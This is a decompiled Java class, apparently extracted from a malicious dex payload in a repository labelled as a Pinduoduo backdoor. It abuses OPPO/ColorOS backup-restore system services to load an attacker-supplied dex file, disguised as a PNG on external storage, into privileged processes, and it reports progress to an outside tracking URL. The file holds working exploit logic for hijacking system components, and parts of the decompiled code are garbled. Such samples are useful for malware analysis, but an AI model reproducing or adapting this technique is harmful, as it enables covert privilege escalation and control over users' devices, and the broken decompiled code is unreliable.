package com.google.android.sd.biz_dynamic_dex.oppo_proxy;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.Messenger;
import android.os.Parcelable;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.server.ProguardUtils;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.server.RemoteTrackUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.utils.BizUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import org.json.JSONObject;

public class OppoProxyExecutor {
  private String clientClassName;
  
  private Messenger clientMessenger = null;
  
  private IProxyClient clientProxy;
  
  private CmdData cmdData;
  
  private ComponentName componentName;
  
  private Context mContext;
  
  private Bundle requestBundle;
  
  private int scene;
  
  private String serverClassName;
  
  private Messenger serverMessenger = null;
  
  private IProxyServerBase serverProxy;
  
  private ServiceConnection serviceConnection;
  
  public OppoProxyExecutor(String paramString1, String paramString2, int paramInt) {
    this.clientClassName = paramString1;
    this.serverClassName = paramString2;
    if (paramInt == 1) {
      this.componentName = new ComponentName("com.heytap.themestore", "com.nearme.themespace.backup.ThemeStoreBRPluginService");
    } else if (paramInt == 0) {
      if (Build.VERSION.SDK_INT >= 29) {
        this.componentName = new ComponentName("com.android.settings", "com.coloros.settings.backuprestore.SettingsBRPluginService");
      } else if (Build.VERSION.SDK_INT == 28) {
        this.componentName = new ComponentName("com.coloros.simsettings", "com.coloros.simsettings.backupandrestore.SimSettingsBRPluginService");
      } else {
        this.componentName = new ComponentName("com.android.settings", "com.oppo.settings.backuprestore.SettingsBRPluginService");
      } 
    } 
    paramString1.hashCode();
    paramInt = -1;
    switch (paramString1.hashCode()) {
      case 1432020591:
        if (!paramString1.equals("com.google.android.sd.biz_dynamic_dex.oppo_reinstall.OppoReInstallExecutor"))
          break; 
        paramInt = 2;
        break;
      case 486512593:
        if (!paramString1.equals("com.google.android.sd.biz_dynamic_dex.oppoau.OppoAUBizExecutor"))
          break; 
        paramInt = 1;
        break;
      case -1996240925:
        if (!paramString1.equals("com.google.android.sd.biz_dynamic_dex.oppoaddwidget.OppoAddWidgetBizExecutor"))
          break; 
        paramInt = 0;
        break;
    } 
    switch (paramInt) {
      case 2:
        this.scene = 1;
        break;
      case 1:
        this.scene = 2;
        break;
      case 0:
        this.scene = 3;
        break;
    } 
    if (paramString1.contains("oppo_permission"))
      this.scene = 4; 
  }
  
  private String copyApkToSd(Context paramContext, File paramFile) {
    if (paramFile != null)
      try {
        if (paramFile.exists()) {
          String str = paramFile.getName();
          File file2 = ProguardUtils.getStorageWorkDir();
          if (!file2.exists() && !file2.mkdirs()) {
            RemoteTrackUtils.submit400TrackAsync(paramContext, 4, false, "make dir fail");
            return "";
          } 
          File file1 = new File(file2, str);
          if (!DynamicUtils.copyFile(paramFile, file1)) {
            RemoteTrackUtils.submit400TrackAsync(paramContext, 4, false, "io fail");
            return "";
          } 
          RemoteTrackUtils.submit400TrackAsync(paramContext, 4, true, "success");
          return file1.getAbsolutePath();
        } 
        RemoteTrackUtils.submit400TrackAsync(paramContext, 4, false, "empty apk file");
        return "";
      } catch (Exception exception) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("exception: ");
        stringBuilder.append(exception.getMessage());
        RemoteTrackUtils.submit400TrackAsync(paramContext, 4, false, stringBuilder.toString());
        return "";
      }  
    RemoteTrackUtils.submit400TrackAsync(paramContext, 4, false, "empty apk file");
    return "";
  }
  
  private boolean copyDexToSd(Context paramContext) {
    try {
      String str;
      StringBuilder stringBuilder;
      File file1 = ProguardUtils.getDexTmpFile(paramContext);
      if (!file1.exists()) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 3, false, "empty dex file");
        return false;
      } 
      File file2 = ProguardUtils.getStorageWorkDir();
      if (!file2.exists() && !file2.mkdirs()) {
        str = sdStateErrorSearch(paramContext);
        stringBuilder = new StringBuilder();
        stringBuilder.append("make dir fail , error state: ");
        stringBuilder.append(str);
        RemoteTrackUtils.submit400TrackAsync(paramContext, 3, false, stringBuilder.toString());
        return false;
      } 
      if (!DynamicUtils.copyFile((File)str, new File((File)stringBuilder, "sdthdy.png"))) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 3, false, "io fail");
        return false;
      } 
      RemoteTrackUtils.submit400TrackAsync(paramContext, 3, true, "success");
      return true;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception: ");
      stringBuilder.append(exception.getMessage());
      RemoteTrackUtils.submit400TrackAsync(paramContext, 3, false, stringBuilder.toString());
      return false;
    } 
  }
  
  public static boolean copyFileTempIfNeed(Context paramContext, String paramString) {
    try {
      if (TextUtils.isEmpty(paramString)) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 5, false, "empty input");
        return false;
      } 
      paramString = (new JSONObject(paramString)).optString("sdthdy_path");
      if (TextUtils.isEmpty(paramString)) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 5, false, "empty dex path");
        return false;
      } 
      File file = new File(paramString);
      if (!file.exists()) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 5, false, "empty dex file");
        return false;
      } 
      if (!DynamicUtils.copyFile(file, ProguardUtils.getDexTmpFile(paramContext))) {
        RemoteTrackUtils.submit400TrackAsync(paramContext, 5, false, "io fail");
        return false;
      } 
      RemoteTrackUtils.submit400TrackAsync(paramContext, 5, true, "success");
      return true;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("exception: ");
      stringBuilder.append(exception.getMessage());
      RemoteTrackUtils.submit400TrackAsync(paramContext, 5, false, stringBuilder.toString());
      return false;
    } 
  }
  
  private boolean copyFileToSd(Context paramContext) {
    if (!copyDexToSd(paramContext))
      return false; 
    int i = this.scene;
    if (i == 1) {
      Bundle bundle = this.requestBundle.getBundle("args");
      if (bundle == null)
        return false; 
      String str = copyApkToSd(paramContext, new File(bundle.getString("BUNDLE_REQUEST_FILE")));
      if (!TextUtils.isEmpty(str)) {
        bundle.putString("BUNDLE_REQUEST_FILE", str);
        this.requestBundle.putBundle("args", bundle);
        return true;
      } 
      return false;
    } 
    return (i != 2 && i != 3) ? ((i == 4)) : true;
  }
  
  private Bundle createRequestBundle() {
    Bundle bundle1 = new Bundle();
    bundle1.putString("method", "innerExecute");
    Bundle bundle2 = this.clientProxy.createRequestBundle(this.mContext, this.cmdData);
    if (bundle2 == null)
      return null; 
    bundle1.putBundle("args", bundle2);
    return bundle1;
  }
  
  private void dispatchErrorSafe(String paramString) {
    try {
      ProguardUtils.deleteFileIfNeed(this.mContext, false);
      if (this.cmdData == null || this.mContext == null) {
        RemoteTrackUtils.remoteLog("dispatch_error_return_null");
        return;
      } 
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("dispatch_error_");
      stringBuilder.append(paramString);
      RemoteTrackUtils.remoteLog(stringBuilder.toString());
      IProxyClient iProxyClient = this.clientProxy;
      if (iProxyClient != null) {
        iProxyClient.handleError(this.mContext, this.cmdData, paramString);
        return;
      } 
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static void onStart(Context paramContext) {
    try {
      RemoteTrackUtils.init();
      RemoteTrackUtils.SID = Utils.getSid(paramContext);
      RemoteTrackUtils.SD_VERSION = BizUtils.getVersion();
      RemoteTrackUtils.URL = "https://public.144dns.com/api/public/ability/ct";
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  private void parseResultBundle(Message paramMessage) {
    Bundle bundle = ((Bundle)paramMessage.obj).getBundle("return");
    this.clientProxy.parseResponseResult(this.mContext, this.cmdData, bundle);
  }
  
  private String sdStateErrorSearch(Context paramContext) {
    StringBuilder stringBuilder = new StringBuilder();
    try {
      stringBuilder.append("sdState is ");
      stringBuilder.append(Environment.getExternalStorageState());
      if (Build.VERSION.SDK_INT >= 23) {
        boolean bool1;
        if (paramContext.checkSelfPermission("android.permission.WRITE_EXTERNAL_STORAGE") == 0) {
          bool1 = true;
        } else {
          bool1 = false;
        } 
        stringBuilder.append(" ,has sdPer : ");
        stringBuilder.append(bool1);
      } 
      StringBuilder stringBuilder1 = new StringBuilder();
      stringBuilder1.append(Environment.getExternalStorageDirectory());
      stringBuilder1.append("/DCIM");
      File file = new File(stringBuilder1.toString(), ".iSpirit");
      boolean bool = file.mkdirs();
      stringBuilder.append(" ,create IPon : ");
      stringBuilder.append(bool);
      if (bool) {
        bool = file.delete();
        stringBuilder.append(" ,delete IPon : ");
        stringBuilder.append(bool);
      } 
    } catch (Exception exception) {
      stringBuilder.append("sdStateSearch error: ");
      stringBuilder.append(exception.getMessage());
    } 
    return stringBuilder.toString();
  }
  
  public void execute(final Context context, final CmdData data) {
    StringBuilder stringBuilder = new StringBuilder();
    stringBuilder.append("start_execute_scene_");
    stringBuilder.append(this.scene);
    RemoteTrackUtils.remoteLog(stringBuilder.toString());
    Utils.runInNewThread(new Runnable() {
          public void run() {
            try {
              OppoProxyExecutor.this.realExecute(context, data);
              return;
            } catch (Exception exception) {
              OppoProxyExecutor oppoProxyExecutor = OppoProxyExecutor.this;
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("setting_execute_error_");
              stringBuilder.append(exception.getMessage());
              oppoProxyExecutor.dispatchErrorSafe(stringBuilder.toString());
              return;
            } 
          }
        });
  }
  
  public void realExecute(final Context context, CmdData paramCmdData) throws Exception {
    this.mContext = context;
    this.cmdData = paramCmdData;
    this.clientProxy = (IProxyClient)Class.forName(this.clientClassName).newInstance();
    this.serverProxy = (IProxyServerBase)Class.forName(this.serverClassName).newInstance();
    if (TextUtils.isEmpty(this.clientClassName) || this.clientProxy == null) {
      dispatchErrorSafe("client_proxy_class_error");
      return;
    } 
    if (TextUtils.isEmpty(this.serverClassName) || this.serverProxy == null) {
      dispatchErrorSafe("server_proxy_class_error");
      return;
    } 
    Bundle bundle = createRequestBundle();
    this.requestBundle = bundle;
    if (bundle == null) {
      dispatchErrorSafe("params_empty");
      return;
    } 
    this.clientMessenger = new Messenger(new Handler(Looper.getMainLooper()) {
          public void handleMessage(Message param1Message) {
            OppoProxyExecutor oppoProxyExecutor;
            Exception exception1;
            super.handleMessage(param1Message);
            try {
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("client_what_");
              stringBuilder.append(param1Message.what);
              stringBuilder.append("_arg1_");
              stringBuilder.append(param1Message.arg1);
              RemoteTrackUtils.remoteLog(stringBuilder.toString());
              if (param1Message.what == 0) {
                Message message = Message.obtain(null, 1, 1, 0, OppoProxyExecutor.this.requestBundle);
                message.replyTo = OppoProxyExecutor.this.clientMessenger;
                OppoProxyExecutor.this.serverMessenger.send(message);
              } else if (param1Message.what == 1) {
                OppoProxyExecutor.this.parseResultBundle(param1Message);
              } else {
                OppoProxyExecutor.this.dispatchErrorSafe("unknown_msg_result");
              } 
              try {
                if (param1Message.what != 0 && OppoProxyExecutor.this.serviceConnection != null) {
                  RemoteTrackUtils.remoteLog("unbind_service");
                  ProguardUtils.deleteFileIfNeed(context, false);
                  OppoProxyExecutor.this.mContext.unbindService(OppoProxyExecutor.this.serviceConnection);
                  return;
                } 
              } catch (Exception null) {
                oppoProxyExecutor = OppoProxyExecutor.this;
                stringBuilder = new StringBuilder();
              } 
            } catch (Exception null) {
              OppoProxyExecutor oppoProxyExecutor1 = OppoProxyExecutor.this;
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("client_error");
              stringBuilder.append(exception1.getMessage());
              oppoProxyExecutor1.dispatchErrorSafe(stringBuilder.toString());
              try {
                if (((Message)oppoProxyExecutor).what != 0 && OppoProxyExecutor.this.serviceConnection != null) {
                  RemoteTrackUtils.remoteLog("unbind_service");
                  ProguardUtils.deleteFileIfNeed(context, false);
                  OppoProxyExecutor.this.mContext.unbindService(OppoProxyExecutor.this.serviceConnection);
                  return;
                } 
              } catch (Exception exception2) {
                oppoProxyExecutor = OppoProxyExecutor.this;
                StringBuilder stringBuilder1 = new StringBuilder();
                stringBuilder1.append("unbind_service_error: ");
                stringBuilder1.append(exception2.getMessage());
                oppoProxyExecutor.dispatchErrorSafe(stringBuilder1.toString());
              } 
            } finally {}
            exception1.append("unbind_service_error: ");
            exception1.append(exception2.getMessage());
            oppoProxyExecutor.dispatchErrorSafe(exception1.toString());
          }
        });
    Intent intent = new Intent();
    intent.setComponent(this.componentName);
    intent.setFlags(268435456);
    this.serviceConnection = new ServiceConnection() {
        public void onBindingDied(ComponentName param1ComponentName) {
          OppoProxyExecutor.this.dispatchErrorSafe("binding_died");
        }
        
        public void onNullBinding(ComponentName param1ComponentName) {
          OppoProxyExecutor.this.dispatchErrorSafe("null_binding");
        }
        
        public void onServiceConnected(ComponentName param1ComponentName, IBinder param1IBinder) {
          try {
            RemoteTrackUtils.remoteLog("on_service_connected");
            if (!OppoProxyExecutor.this.copyFileToSd(context)) {
              OppoProxyExecutor.this.dispatchErrorSafe("empty_working_file");
              context.unbindService(OppoProxyExecutor.this.serviceConnection);
              return;
            } 
            File file = new File(ProguardUtils.getStorageWorkDir(), ProguardUtils.getStorageDexName());
            if (!file.exists()) {
              OppoProxyExecutor.this.dispatchErrorSafe("empty_dex_file");
              context.unbindService(OppoProxyExecutor.this.serviceConnection);
              return;
            } 
            OppoProxyExecutor.access$302(OppoProxyExecutor.this, new Messenger(param1IBinder));
            Bundle bundle1 = new Bundle();
            bundle1.putString("method", "onCreate");
            Bundle bundle2 = new Bundle();
            Bundle bundle3 = new Bundle();
            bundle3.putInt("br_type", 0);
            bundle3.putInt("log_level", 5);
            bundle2.putBundle("config", bundle3);
            bundle3 = new Bundle();
            bundle3.putStringArray("dexPaths", new String[] { file.getAbsolutePath() });
            bundle3.putStringArray("pluginClass", new String[] { OppoProxyExecutor.access$800(this.this$0) });
            bundle3.putBoolean("useParentClass", true);
            bundle2.putParcelableArray("plugins", new Parcelable[] { (Parcelable)bundle3 });
            bundle1.putBundle("args", bundle2);
            Message message = Message.obtain(null, 0, 1, 0, bundle1);
            message.replyTo = OppoProxyExecutor.this.clientMessenger;
            OppoProxyExecutor.this.serverMessenger.send(message);
            return;
          } catch (Exception exception) {
            try {
              OppoProxyExecutor oppoProxyExecutor = OppoProxyExecutor.this;
              StringBuilder stringBuilder = new StringBuilder();
              stringBuilder.append("bind_server_error: ");
              stringBuilder.append(exception.getMessage());
              oppoProxyExecutor.dispatchErrorSafe(stringBuilder.toString());
              context.unbindService(this);
              return;
            } catch (Exception exception1) {
              return;
            } 
          } 
        }
        
        public void onServiceDisconnected(ComponentName param1ComponentName) {
          OppoProxyExecutor.this.dispatchErrorSafe("service_disconnected");
        }
      };
    RemoteTrackUtils.remoteLog("start_bind_service");
    this.mContext.bindService(intent, this.serviceConnection, 1);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_proxy\OppoProxyExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */